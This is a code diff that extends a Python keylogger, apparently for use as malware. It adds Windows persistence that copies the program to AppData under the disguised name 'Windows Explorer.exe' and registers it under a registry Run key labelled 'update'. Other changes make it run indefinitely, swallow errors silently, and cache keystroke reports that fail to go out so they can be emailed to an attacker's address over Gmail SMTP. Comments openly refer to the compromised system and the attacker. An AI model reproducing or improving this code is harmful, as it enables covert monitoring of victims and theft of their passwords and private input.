@@ -15,6 +15,25 @@ import subprocess
 from threading import Thread
 
 """ 
+* Function Name:  execute_on_startup()
+* Input:          None
+* Output:         None
+* Logic:          The function is used to make the executable file to run in the background of the compromised system on start up.
+* Example Call:   execute_on_startup()
+"""
+def execute_on_startup():
+    try:
+        if(platform.system() == "Windows"):
+            backdoor_loc = os.environ["appdata"] + "\\Windows Explorer.exe"
+            if(not os.path.exists(backdoor_loc)):
+                shutil.copyfile(sys.executable, backdoor_loc)
+                sys_command = 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_loc + '"'
+                result = execute_system_command(sys_command)
+    
+    except:
+        pass
+
+""" 
 * Function Name:  get_current_time()
 * Input:          None
 * Output:         current_time (list): Current time in list format: [hour, minute, day, month, year].
@@ -148,11 +167,22 @@ def key_listener():
 * Example Call:   send_mail("attacker@gmail.com", "123456", "LOGS: .....", "attacker@gmail.com")
 """
 def send_mail(email, password, report, report_email):
-    server = smtplib.SMTP("smtp.gmail.com", 587)
-    server.starttls()
-    server.login(email, password)
-    server.sendmail(email, report_email, report)
-    server.quit()
+    global stored_reports
+
+    try:        
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+
+        if(stored_reports != ""):
+            report = report + "\n\n\n" + "-"*100 + "\nSTORED REPORTS:\n\n" + stored_reports
+
+        server.sendmail(email, report_email, report)
+        server.quit()
+        stored_reports = ""
+
+    except:
+        stored_reports = report + "\n\n\n" + "-"*100 + "\n" + stored_reports
 
 """ 
 * Function Name:  get_user()
@@ -188,13 +218,20 @@ def report(report_email, interval, start_time, end_time, email, password):
 
         return copied_time
 
+    global log
+
     user = get_user()
 
     template = "Subject: KEYLOG Report of USER: {}\n\n".format(user)
     template += "KEYLOG REPORT\n\n"
     template += "User: {}\n".format(user)
     template += "Start Time: {}:{}, {}/{}/{}\n".format(*format_time(start_time))
-    template += "End Time: {}:{}, {}/{}/{}\n\n".format(*format_time(end_time))
+
+    if(end_time != None):
+        template += "End Time: {}:{}, {}/{}/{}\n\n".format(*format_time(end_time))
+
+    else:
+        template += "End Time: None\n\n"
 
     if(end_time != None): scheduled_end_time = datetime.datetime(*end_time[4:1:-1], end_time[0], end_time[1])
     current_time = get_current_time()
@@ -237,20 +274,26 @@ def report(report_email, interval, start_time, end_time, email, password):
 if __name__ == "__main__":
     REPORT_EMAIL = ""                       # enter the email id to which the log data should be sent
     INTERVAL = 300                          # the interval (in seconds) in which the log data has to be sent by mail
-    DURATION = 1                            # The total duration (in hours) for which the keylogger should run. None if the keylogger should run indefinitely.
+    DURATION = None                         # The total duration (in hours) for which the keylogger should run. None if the keylogger should run indefinitely.
 
     EMAIL = ""                              # enter the email from which the report should be sent to the attacker
     PASSWORD = ""                           # enter the password of the email id
 
     log = ""
+    stored_reports = ""
 
-    start_time = get_current_time()
-    end_time = calculate_end_time(start_time, DURATION)
+    try:
+        execute_on_startup()
+        start_time = get_current_time()
+        end_time = calculate_end_time(start_time, DURATION)
 
-    logging_thread = Thread(target=key_listener)
-    reporting_thread = Thread(target=report, args=(REPORT_EMAIL, INTERVAL, start_time, end_time, EMAIL, PASSWORD,))
-    
-    logging_thread.start()
-    reporting_thread.start()    
+        logging_thread = Thread(target=key_listener)
+        reporting_thread = Thread(target=report, args=(REPORT_EMAIL, INTERVAL, start_time, end_time, EMAIL, PASSWORD,))
 
+        logging_thread.daemon = True
+        
+        logging_thread.start()
+        reporting_thread.start()    
 
+    except:
+        pass
